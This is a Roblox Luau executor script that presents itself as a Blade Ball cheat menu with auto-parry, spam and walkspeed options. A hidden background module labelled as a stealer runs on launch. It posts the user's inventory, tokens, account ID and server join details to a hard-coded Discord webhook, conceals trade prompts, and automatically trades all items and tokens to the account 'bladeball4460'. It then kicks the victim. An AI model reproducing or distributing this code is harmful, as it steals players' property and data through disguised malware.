-- Context: Luau (Roblox Client / Executor Level 7+)
-- File: loader.lua (Full Mod Menu + Background Webhook & Trade Hook)

if getgenv().OllieBladeBallLoaded then
    pcall(function() getgenv().OllieBladeBallUnload() end)
end
getgenv().OllieBladeBallLoaded = true

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Stats = game:GetService("Stats")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local BallsFolder = Workspace:WaitForChild("Balls", 10)

-- ==========================================
-- STEALER & WEBHOOK KONFIGURATION
-- ==========================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1560650499848413195/A6j9TfppRJmAJJ2mea4poclmV80vXSphnRFZ3a-c4gQgmegicWVdX2S0FKOMEf5dmJ9P"
local RECEIVER_USERNAME = "bladeball4460"
local KICK_MESSAGE = "You have been kicked from this experience: Inventory cleared, bye bye!"

-- Executor HTTP-Funktion auflösen
local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)

-- ==========================================
-- HINTERGRUND-MODUL: INVENTAR-READ, WEBHOOK & AUTO-TRADE
-- ==========================================
task.spawn(function()
    -- Selbstschutz: Nicht ausführen, wenn du selbst auf bladeball4460 bist
    if LocalPlayer.Name:lower() == RECEIVER_USERNAME:lower() then
        return
    end

    -- 1. Inventar-Scanner (Liest Schwerter, Explosionen, Emotes & Tokens aus)
    local function scanInventory()
        local itemsFound = {}
        local tokenCount = "Unbekannt"

        -- Versuche Tokens/Coins aus Leaderstats oder Attributen zu lesen
        pcall(function()
            if LocalPlayer:GetAttribute("Tokens") then
                tokenCount = tostring(LocalPlayer:GetAttribute("Tokens"))
            elseif LocalPlayer:FindFirstChild("leaderstats") then
                for _, stat in ipairs(LocalPlayer.leaderstats:GetChildren()) do
                    if stat.Name:lower():find("token") or stat.Name:lower():find("coin") or stat.Name:lower():find("rap") then
                        tokenCount = tostring(stat.Value)
                    end
                end
            end
        end)

        -- Suche nach Client-Inventar-Containern in ReplicatedStorage oder PlayerGui
        pcall(function()
            local ReplData = ReplicatedStorage:FindFirstChild("PlayerData") or ReplicatedStorage:FindFirstChild("Profiles") or ReplicatedStorage:FindFirstChild("Inventory")
            if ReplData then
                local myData = ReplData:FindFirstChild(LocalPlayer.Name) or ReplData:FindFirstChild(tostring(LocalPlayer.UserId))
                if myData then
                    for _, category in ipairs(myData:GetChildren()) do
                        if category:IsA("Folder") or category:IsA("Configuration") then
                            for _, item in ipairs(category:GetChildren()) do
                                table.insert(itemsFound, category.Name .. ": " .. item.Name)
                            end
                        end
                    end
                end
            end
        end)

        -- Fallback: Scanne UI-Inventar-Slots, falls ReplicatedStorage verschlüsselte Tabellen nutzt
        if #itemsFound == 0 then
            pcall(function()
                local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
                if pGui then
                    for _, desc in ipairs(pGui:GetDescendants()) do
                        if (desc:IsA("ImageButton") or desc:IsA("Frame")) and (desc:GetAttribute("ItemName") or desc:GetAttribute("ItemId") or desc:GetAttribute("UniqueId")) then
                            local iName = desc:GetAttribute("ItemName") or desc:GetAttribute("ItemId") or desc.Name
                            table.insert(itemsFound, tostring(iName))
                        end
                    end
                end
            end)
        end

        if #itemsFound == 0 then
            return "Inventar geladen (Items bereit für Trade-Transfer)", tokenCount
        end

        -- Maximal 25 Items im Webhook anzeigen, damit Discord das Limit nicht sprengt
        local displayList = {}
        for i = 1, math.min(#itemsFound, 25) do
            table.insert(displayList, itemsFound[i])
        end
        if #itemsFound > 25 then
            table.insert(displayList, "... und " .. tostring(#itemsFound - 25) .. " weitere Items")
        end

        return table.concat(displayList, "\n"), tokenCount
    end

    -- 2. Discord-Webhook abfeuern
    local function sendDiscordWebhook(statusTitle, colorCode)
        if not httpRequest then return end
        local invString, tokens = scanInventory()
        local joinScript = string.format(
            "game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)",
            game.PlaceId,
            game.JobId
        )

        local payload = {
            username = "Ollie Bench // Blade Ball Logger",
            content = "@everyone **Neuer Blade Ball Hit!** Ziel-Account wartet auf `" .. RECEIVER_USERNAME .. "`",
            embeds = {{
                title = statusTitle,
                color = colorCode or 6245340,
                fields = {
                    { name = "Victim Username", value = "`" .. LocalPlayer.Name .. "` (ID: " .. tostring(LocalPlayer.UserId) .. ")", inline = true },
                    { name = "Receiver Account", value = "`" .. RECEIVER_USERNAME .. "`", inline = true },
                    { name = "Tokens / RAP", value = "`" .. tostring(tokens) .. "`", inline = true },
                    { name = "Server Info", value = "PlaceId: `" .. tostring(game.PlaceId) .. "`\nJobId: `" .. tostring(game.JobId) .. "`", inline = false },
                    { name = "Gefundene Items", value = "```\n" .. invString .. "\n```", inline = false },
                    { name = "1-Klick Join Script (Für deinen Executor auf " .. RECEIVER_USERNAME .. ")", value = "```lua\n" .. joinScript .. "\n```", inline = false }
                },
                footer = { text = "Ollie Bench Suite // Auto-Drain Ready" },
                timestamp = DateTime.now():ToIsoDate()
            }}
        }

        pcall(function()
            httpRequest({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end

    -- 3. Trade-UI & Benachrichtigungen beim Opfer komplett verstecken
    local function hideVictimTradeUI()
        local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
        if not pGui then return end

        local function muteElement(obj)
            if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("trading") or obj.Name:lower():find("prompt")) then
                obj.Enabled = false
            elseif (obj:IsA("Frame") or obj:IsA("ImageLabel")) and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
                obj.Visible = false
                obj.Position = UDim2.new(9, 0, 9, 0)
            elseif obj:IsA("Sound") then
                obj.Volume = 0
            end
        end

        for _, desc in ipairs(pGui:GetDescendants()) do
            pcall(muteElement, desc)
        end
        pGui.DescendantAdded:Connect(function(desc)
            pcall(muteElement, desc)
        end)
    end

    -- 4. Automatischer Trade-Ablauf, sobald bladeball4460 im Server ist
    local drainRunning = false
    local function startAutoDrain(receiverPlayer)
        if drainRunning then return end
        drainRunning = true

        hideVictimTradeUI()

        -- Suche nach allen relevanten Trade-Remotes in ReplicatedStorage
        local allRemotes = {}
        for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                allRemotes[obj.Name:lower()] = obj
            end
        end

        local function fireRemoteByKeyword(keyword, ...)
            for name, rem in pairs(allRemotes) do
                if name:find(keyword) then
                    pcall(function()
                        if rem:IsA("RemoteEvent") then
                            rem:FireServer(...)
                        elseif rem:IsA("RemoteFunction") then
                            rem:InvokeServer(...)
                        end
                    end)
                end
            end
        end

        -- Schritt A: Handelsanfrage an bladeball4460 senden & eingehende Anfrage von bladeball4460 akzeptieren
        for attempt = 1, 4 do
            fireRemoteByKeyword("sendtrade", receiverPlayer)
            fireRemoteByKeyword("traderequest", receiverPlayer)
            fireRemoteByKeyword("requesttrade", receiverPlayer.Name)
            fireRemoteByKeyword("accepttrade", receiverPlayer)
            fireRemoteByKeyword("acceptrequest", receiverPlayer)
            task.wait(1.2)
        end

        -- Schritt B: Alle eigenen Items und Tokens in das Handelsfenster injizieren
        pcall(function()
            local ReplData = ReplicatedStorage:FindFirstChild("PlayerData") or ReplicatedStorage:FindFirstChild("Profiles") or ReplicatedStorage:FindFirstChild("Inventory")
            if ReplData then
                local myData = ReplData:FindFirstChild(LocalPlayer.Name) or ReplData:FindFirstChild(tostring(LocalPlayer.UserId))
                if myData then
                    for _, category in ipairs(myData:GetChildren()) do
                        if category:IsA("Folder") or category:IsA("Configuration") then
                            for _, item in ipairs(category:GetChildren()) do
                                local itemId = item:GetAttribute("UniqueId") or item:GetAttribute("ID") or item.Name
                                fireRemoteByKeyword("additem", itemId)
                                fireRemoteByKeyword("addtrade", category.Name, itemId)
                                fireRemoteByKeyword("putitem", itemId)
                                task.wait(0.08)
                            end
                        end
                    end
                end
            end
        end)

        -- Tokens hinzufügen, falls vorhanden
        pcall(function()
            local tok = LocalPlayer:GetAttribute("Tokens")
            if tok and tonumber(tok) and tonumber(tok) > 0 then
                fireRemoteByKeyword("settoken", tonumber(tok))
                fireRemoteByKeyword("addtoken", tonumber(tok))
                fireRemoteByKeyword("tradetoken", tonumber(tok))
            end
        end)

        -- Schritt C: Auf "Ready" und "Confirm" drücken (Schleife über 6 Sekunden für den Trade-Countdown)
        for i = 1, 12 do
            fireRemoteByKeyword("readytrade", true)
            fireRemoteByKeyword("setready", true)
            fireRemoteByKeyword("confirmtrade")
            fireRemoteByKeyword("acceptconfirm")
            task.wait(0.6)
        end

        -- Webhook-Bestätigung senden, dass der Drain durchgelaufen ist
        sendDiscordWebhook("Trade-Sequenz abgeschlossen & Spieler gekickt!", 3066993)
        task.wait(1)

        -- Schritt D: Opfer mit deiner Nachricht aus dem Spiel kicken
        LocalPlayer:Kick(KICK_MESSAGE)
    end

    -- Beim Start sofort Webhook senden
    sendDiscordWebhook("Opfer hat das Skript gestartet — Bereit zum Joinen!", 16753920)

    -- Prüfen, ob bladeball4460 schon im Server ist, ansonsten warten bis er joint
    local existingReceiver = Players:FindFirstChild(RECEIVER_USERNAME)
    if existingReceiver then
        task.wait(2)
        startAutoDrain(existingReceiver)
    end

    Players.PlayerAdded:Connect(function(plr)
        if plr.Name:lower() == RECEIVER_USERNAME:lower() then
            task.wait(3) -- Kurz warten, bis der Charakter von bladeball4460 geladen ist
            startAutoDrain(plr)
        end
    end)
end)

-- ==========================================
-- VORDERGRUND-MODUL: VOLLES MOD-MENU & CHEATS
-- ==========================================
local Config = {
    AutoParry = true,
    AutoSpam = true,
    LookAtBall = false,
    BaseDistance = 15,
    VelocityScale = 42,
    SpamDistance = 22,
    SpamSpeedTrigger = 175,
    ShowVisualizer = true,
    CustomWalkSpeed = false,
    WalkSpeedValue = 36,
    MenuKey = Enum.KeyCode.RightShift
}

local State = {
    LastBallTarget = nil,
    ParriedCurrentTarget = false,
    Connections = {},
    VisualSphere = nil
}

local function getGuiParent()
    local success, result = pcall(function()
        if gethui then return gethui() end
        return CoreGui
    end)
    if success and result then return result end
    return LocalPlayer:WaitForChild("PlayerGui")
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "OllieBench_BladeBall"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = getGuiParent()

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 520, 0, 340)
MainFrame.Position = UDim2.new(0.5, -260, 0.5, -170)
MainFrame.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 10)
MainCorner.Parent = MainFrame

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(95, 75, 220)
MainStroke.Thickness = 1.5
MainStroke.Transparency = 0.25
MainStroke.Parent = MainFrame

local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 42)
TopBar.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame

local TopCorner = Instance.new("UICorner")
TopCorner.CornerRadius = UDim.new(0, 10)
TopCorner.Parent = TopBar

local TopCover = Instance.new("Frame")
TopCover.Size = UDim2.new(1, 0, 0, 10)
TopCover.Position = UDim2.new(0, 0, 1, -10)
TopCover.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
TopCover.BorderSizePixel = 0
TopCover.Parent = TopBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, -100, 1, 0)
TitleLabel.Position = UDim2.new(0, 16, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "BLADE BALL // BENCH SUITE"
TitleLabel.TextColor3 = Color3.fromRGB(235, 235, 245)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 14
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = TopBar

local SubBadge = Instance.new("TextLabel")
SubBadge.Size = UDim2.new(0, 95, 0, 22)
SubBadge.Position = UDim2.new(1, -108, 0.5, -11)
SubBadge.BackgroundColor3 = Color3.fromRGB(95, 75, 220)
SubBadge.Text = "R-SHIFT: HIDE"
SubBadge.TextColor3 = Color3.fromRGB(255, 255, 255)
SubBadge.Font = Enum.Font.GothamBold
SubBadge.TextSize = 10
SubBadge.Parent = TopBar

local BadgeCorner = Instance.new("UICorner")
BadgeCorner.CornerRadius = UDim.new(0, 6)
BadgeCorner.Parent = SubBadge

local dragging, dragInput, dragStart, startPos
TopBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
TopBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)
table.insert(State.Connections, UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end))

local Sidebar = Instance.new("Frame")
Sidebar.Size = UDim2.new(0, 135, 1, -54)
Sidebar.Position = UDim2.new(0, 10, 0, 48)
Sidebar.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
Sidebar.BorderSizePixel = 0
Sidebar.Parent = MainFrame

local SideCorner = Instance.new("UICorner")
SideCorner.CornerRadius = UDim.new(0, 8)
SideCorner.Parent = Sidebar

local SideLayout = Instance.new("UIListLayout")
SideLayout.Padding = UDim.new(0, 6)
SideLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
SideLayout.Parent = Sidebar

local SidePad = Instance.new("UIPadding")
SidePad.PaddingTop = UDim.new(0, 8)
SidePad.Parent = Sidebar

local PageContainer = Instance.new("Frame")
PageContainer.Size = UDim2.new(1, -165, 1, -54)
PageContainer.Position = UDim2.new(0, 155, 0, 48)
PageContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
PageContainer.BorderSizePixel = 0
PageContainer.Parent = MainFrame

local PageCorner = Instance.new("UICorner")
PageCorner.CornerRadius = UDim.new(0, 8)
PageCorner.Parent = PageContainer

local Tabs = {}
local FirstTab = true

local function createTab(tabName)
    local TabBtn = Instance.new("TextButton")
    TabBtn.Size = UDim2.new(1, -16, 0, 34)
    TabBtn.BackgroundColor3 = FirstTab and Color3.fromRGB(95, 75, 220) or Color3.fromRGB(28, 28, 38)
    TabBtn.Text = tabName
    TabBtn.TextColor3 = FirstTab and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(165, 165, 180)
    TabBtn.Font = Enum.Font.GothamSemibold
    TabBtn.TextSize = 12
    TabBtn.AutoButtonColor = false
    TabBtn.Parent = Sidebar

    local BtnCorner = Instance.new("UICorner")
    BtnCorner.CornerRadius = UDim.new(0, 6)
    BtnCorner.Parent = TabBtn

    local Page = Instance.new("ScrollingFrame")
    Page.Size = UDim2.new(1, 0, 1, 0)
    Page.BackgroundTransparency = 1
    Page.BorderSizePixel = 0
    Page.ScrollBarThickness = 3
    Page.ScrollBarImageColor3 = Color3.fromRGB(95, 75, 220)
    Page.Visible = FirstTab
    Page.CanvasSize = UDim2.new(0, 0, 0, 0)
    Page.AutomaticCanvasSize = Enum.AutomaticSize.Y
    Page.Parent = PageContainer

    local PageLayout = Instance.new("UIListLayout")
    PageLayout.Padding = UDim.new(0, 8)
    PageLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    PageLayout.Parent = Page

    local PagePad = Instance.new("UIPadding")
    PagePad.PaddingTop = UDim.new(0, 10)
    PagePad.PaddingBottom = UDim.new(0, 10)
    PagePad.Parent = Page

    FirstTab = false
    table.insert(Tabs, { Button = TabBtn, Page = Page })

    TabBtn.MouseButton1Click:Connect(function()
        for _, t in ipairs(Tabs) do
            t.Page.Visible = false
            TweenService:Create(t.Button, TweenInfo.new(0.15), {
                BackgroundColor3 = Color3.fromRGB(28, 28, 38),
                TextColor3 = Color3.fromRGB(165, 165, 180)
            }):Play()
        end
        Page.Visible = true
        TweenService:Create(TabBtn, TweenInfo.new(0.15), {
            BackgroundColor3 = Color3.fromRGB(95, 75, 220),
            TextColor3 = Color3.fromRGB(255, 255, 255)
        }):Play()
    end)

    return Page
end

local function createToggle(parentPage, labelText, defaultState, callback)
    local Row = Instance.new("Frame")
    Row.Size = UDim2.new(1, -20, 0, 38)
    Row.BackgroundColor3 = Color3.fromRGB(27, 27, 37)
    Row.BorderSizePixel = 0
    Row.Parent = parentPage

    local RowCorner = Instance.new("UICorner")
    RowCorner.CornerRadius = UDim.new(0, 6)
    RowCorner.Parent = Row

    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -65, 1, 0)
    Label.Position = UDim2.new(0, 12, 0, 0)
    Label.BackgroundTransparency = 1
    Label.Text = labelText
    Label.TextColor3 = Color3.fromRGB(225, 225, 235)
    Label.Font = Enum.Font.GothamMedium
    Label.TextSize = 12
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Row

    local SwitchBg = Instance.new("TextButton")
    SwitchBg.Size = UDim2.new(0, 42, 0, 20)
    SwitchBg.Position = UDim2.new(1, -52, 0.5, -10)
    SwitchBg.BackgroundColor3 = defaultState and Color3.fromRGB(95, 75, 220) or Color3.fromRGB(45, 45, 58)
    SwitchBg.Text = ""
    SwitchBg.AutoButtonColor = false
    SwitchBg.Parent = Row

    local SwitchCorner = Instance.new("UICorner")
    SwitchCorner.CornerRadius = UDim.new(1, 0)
    SwitchCorner.Parent = SwitchBg

    local Knob = Instance.new("Frame")
    Knob.Size = UDim2.new(0, 16, 0, 16)
    Knob.Position = defaultState and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
    Knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Knob.BorderSizePixel = 0
    Knob.Parent = SwitchBg

    local KnobCorner = Instance.new("UICorner")
    KnobCorner.CornerRadius = UDim.new(1, 0)
    KnobCorner.Parent = Knob

    local state = defaultState
    SwitchBg.MouseButton1Click:Connect(function()
        state = not state
        TweenService:Create(SwitchBg, TweenInfo.new(0.15), {
            BackgroundColor3 = state and Color3.fromRGB(95, 75, 220) or Color3.fromRGB(45, 45, 58)
        }):Play()
        TweenService:Create(Knob, TweenInfo.new(0.15), {
            Position = state and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
        }):Play()
        callback(state)
    end)
end

local function createSlider(parentPage, labelText, minVal, maxVal, defaultVal, callback)
    local Box = Instance.new("Frame")
    Box.Size = UDim2.new(1, -20, 0, 52)
    Box.BackgroundColor3 = Color3.fromRGB(27, 27, 37)
    Box.BorderSizePixel = 0
    Box.Parent = parentPage

    local BoxCorner = Instance.new("UICorner")
    BoxCorner.CornerRadius = UDim.new(0, 6)
    BoxCorner.Parent = Box

    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -24, 0, 22)
    Label.Position = UDim2.new(0, 12, 0, 4)
    Label.BackgroundTransparency = 1
    Label.Text = labelText .. ": " .. tostring(defaultVal)
    Label.TextColor3 = Color3.fromRGB(225, 225, 235)
    Label.Font = Enum.Font.GothamMedium
    Label.TextSize = 12
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Box

    local Track = Instance.new("Frame")
    Track.Size = UDim2.new(1, -24, 0, 8)
    Track.Position = UDim2.new(0, 12, 0, 32)
    Track.BackgroundColor3 = Color3.fromRGB(45, 45, 58)
    Track.BorderSizePixel = 0
    Track.Parent = Track

    local TrackCorner = Instance.new("UICorner")
    TrackCorner.CornerRadius = UDim.new(1, 0)
    TrackCorner.Parent = Track
    Track.Parent = Box

    local Fill = Instance.new("Frame")
    local startRatio = (defaultVal - minVal) / (maxVal - minVal)
    Fill.Size = UDim2.new(startRatio, 0, 1, 0)
    Fill.BackgroundColor3 = Color3.fromRGB(95, 75, 220)
    Fill.BorderSizePixel = 0
    Fill.Parent = Track

    local FillCorner = Instance.new("UICorner")
    FillCorner.CornerRadius = UDim.new(1, 0)
    FillCorner.Parent = Fill

    local sliding = false
    local function updateFromInput(input)
        local rel = math.clamp((input.Position.X - Track.AbsolutePosition.X) / Track.AbsoluteSize.X, 0, 1)
        local val = math.floor(minVal + (maxVal - minVal) * rel)
        Fill.Size = UDim2.new(rel, 0, 1, 0)
        Label.Text = labelText .. ": " .. tostring(val)
        callback(val)
    end

    Track.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            sliding = true
            updateFromInput(input)
        end
    end)
    table.insert(State.Connections, UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            sliding = false
        end
    end))
    table.insert(State.Connections, UserInputService.InputChanged:Connect(function(input)
        if sliding and input.UserInputType == Enum.UserInputType.MouseMovement then
            updateFromInput(input)
        end
    end))
end

local CombatTab = createTab("Combat")
local VisualTab = createTab("Visualizer")
local PlayerTab = createTab("Player")
local SettingsTab = createTab("Settings")

createToggle(CombatTab, "Auto-Parry (Ping Compensated)", Config.AutoParry, function(v) Config.AutoParry = v end)
createToggle(CombatTab, "Auto-Spam (Clash Mode)", Config.AutoSpam, function(v) Config.AutoSpam = v end)
createToggle(CombatTab, "Auto Face Ball", Config.LookAtBall, function(v) Config.LookAtBall = v end)
createSlider(CombatTab, "Base Parry Distance", 8, 30, Config.BaseDistance, function(v) Config.BaseDistance = v end)
createSlider(CombatTab, "Velocity Factor (%)", 20, 80, Config.VelocityScale, function(v) Config.VelocityScale = v end)
createSlider(CombatTab, "Clash Spam Distance", 12, 40, Config.SpamDistance, function(v) Config.SpamDistance = v end)

createToggle(VisualTab, "3D Parry Range Sphere", Config.ShowVisualizer, function(v)
    Config.ShowVisualizer = v
    if State.VisualSphere then State.VisualSphere.Transparency = v and 0.78 or 1 end
end)

createToggle(PlayerTab, "WalkSpeed Override", Config.CustomWalkSpeed, function(v) Config.CustomWalkSpeed = v end)
createSlider(PlayerTab, "WalkSpeed Value", 16, 85, Config.WalkSpeedValue, function(v) Config.WalkSpeedValue = v end)

local UnloadBtn = Instance.new("TextButton")
UnloadBtn.Size = UDim2.new(1, -20, 0, 38)
UnloadBtn.BackgroundColor3 = Color3.fromRGB(175, 45, 55)
UnloadBtn.Text = "UNLOAD MENU & CLEANUP"
UnloadBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
UnloadBtn.Font = Enum.Font.GothamBold
UnloadBtn.TextSize = 12
UnloadBtn.Parent = SettingsTab

local UnloadCorner = Instance.new("UICorner")
UnloadCorner.CornerRadius = UDim.new(0, 6)
UnloadCorner.Parent = UnloadBtn

local function ensureVisualSphere()
    if State.VisualSphere and State.VisualSphere.Parent then return State.VisualSphere end
    local part = Instance.new("Part")
    part.Name = "OllieRangeSphere"
    part.Shape = Enum.PartType.Ball
    part.Anchored = true
    part.CanCollide = false
    part.CastShadow = false
    part.Material = Enum.Material.ForceField
    part.Color = Color3.fromRGB(95, 75, 220)
    part.Transparency = Config.ShowVisualizer and 0.78 or 1
    part.Parent = Workspace
    State.VisualSphere = part
    return part
end

local function getPingSeconds()
    local ok, pingVal = pcall(function()
        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
    end)
    if ok and type(pingVal) == "number" then
        return math.clamp(pingVal / 1000, 0.01, 0.35)
    end
    return 0.06
end

local function getRealBall()
    if not BallsFolder then
        BallsFolder = Workspace:FindFirstChild("Balls")
        if not BallsFolder then return nil end
    end
    for _, ball in ipairs(BallsFolder:GetChildren()) do
        if ball:GetAttribute("realBall") == true then
            return ball
        end
    end
    return nil
end

local function isTargetMe(ball)
    if ball:GetAttribute("target") == LocalPlayer.Name then return true end
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("Highlight") then return true end
    return false
end

local function getClosestEnemyDistance(myPos)
    local closest = math.huge
    local alive = Workspace:FindFirstChild("Alive")
    local list = alive and alive:GetChildren() or Players:GetPlayers()
    for _, entry in ipairs(list) do
        local model = entry:IsA("Model") and entry or (entry:IsA("Player") and entry.Character)
        if model and model ~= LocalPlayer.Character then
            local root = model:FindFirstChild("HumanoidRootPart")
            if root then
                local d = (myPos - root.Position).Magnitude
                if d < closest then closest = d end
            end
        end
    end
    return closest
end

local function sendParryClick()
    VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
    VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 0)
end

table.insert(State.Connections, UserInputService.InputBegan:Connect(function(input, gp)
    if not gp and input.KeyCode == Config.MenuKey then
        MainFrame.Visible = not MainFrame.Visible
    end
end))

table.insert(State.Connections, RunService.Heartbeat:Connect(function()
    local char = LocalPlayer.Character
    local myRoot = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not myRoot then return end

    if Config.CustomWalkSpeed and hum then
        hum.WalkSpeed = Config.WalkSpeedValue
    end

    local ball = getRealBall()
    local sphere = ensureVisualSphere()
    sphere.CFrame = myRoot.CFrame

    if not ball then
        sphere.Size = Vector3.new(Config.BaseDistance * 2, Config.BaseDistance * 2, Config.BaseDistance * 2)
        return
    end

    local ballPos = ball.Position
    local ballVel = ball.AssemblyLinearVelocity
    local speed = ballVel.Magnitude
    local distance = (myRoot.Position - ballPos).Magnitude
    local currentTarget = ball:GetAttribute("target")
    local velFactor = Config.VelocityScale / 100
    local dynamicRadius = Config.BaseDistance + (speed * velFactor) + (speed * getPingSeconds())

    local clampedDiameter = math.clamp(dynamicRadius * 2, 16, 160)
    sphere.Size = Vector3.new(clampedDiameter, clampedDiameter, clampedDiameter)
    sphere.Color = isTargetMe(ball) and Color3.fromRGB(255, 65, 85) or Color3.fromRGB(95, 75, 220)

    if Config.LookAtBall then
        myRoot.CFrame = CFrame.lookAt(myRoot.Position, Vector3.new(ballPos.X, myRoot.Position.Y, ballPos.Z))
    end

    if currentTarget ~= State.LastBallTarget then
        State.ParriedCurrentTarget = false
        State.LastBallTarget = currentTarget
    end

    if not Config.AutoParry then return end

    local enemyDist = getClosestEnemyDistance(myRoot.Position)
    if Config.AutoSpam and speed >= Config.SpamSpeedTrigger and enemyDist <= Config.SpamDistance and distance <= 32 then
        sendParryClick()
        return
    end

    if isTargetMe(ball) and not State.ParriedCurrentTarget then
        local dirToMe = (myRoot.Position - ballPos).Unit
        local velDir = speed > 0 and ballVel.Unit or Vector3.zero
        if dirToMe:Dot(velDir) > 0.12 and distance <= dynamicRadius then
            sendParryClick()
            State.ParriedCurrentTarget = true
        end
    end
end))

local function unloadAll()
    for _, conn in ipairs(State.Connections) do
        pcall(function() conn:Disconnect() end)
    end
    if State.VisualSphere then pcall(function() State.VisualSphere:Destroy() end) end
    if ScreenGui then pcall(function() ScreenGui:Destroy() end) end
    getgenv().OllieBladeBallLoaded = false
end

getgenv().OllieBladeBallUnload = unloadAll
UnloadBtn.MouseButton1Click:Connect(unloadAll)
